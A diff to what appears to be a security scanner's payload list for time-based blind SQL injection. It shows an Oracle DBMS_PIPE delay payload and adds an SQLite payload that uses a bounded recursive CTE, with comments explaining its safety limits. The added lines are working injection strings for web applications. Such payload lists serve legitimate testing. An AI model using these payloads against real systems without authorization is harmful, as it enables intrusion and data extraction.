@@ -19,3 +19,12 @@
 
 # --- Oracle (DBMS_PIPE.RECEIVE_MESSAGE - a bounded receive timeout) ---
 %B' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%N)-- -
+
+# --- SQLite (no built-in SLEEP/WAITFOR/PG_SLEEP/DBMS_PIPE at all - every one
+# of those provokes an immediate "no such function" error, never a delay, on
+# a genuinely SQLite-backed target). A bounded recursive CTE is the SQLite-safe
+# substitute: it costs real, measurable CPU time proportional to a small,
+# capped iteration count (200000 * %N, so at most 2,000,000 steps at the
+# probe's own 1-10s clamp) and writes nothing - a pure, terminating read that
+# is never an unbounded loop and never a DoS.)
+%B' AND (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<200000*%N) SELECT x FROM r))=-1-- -
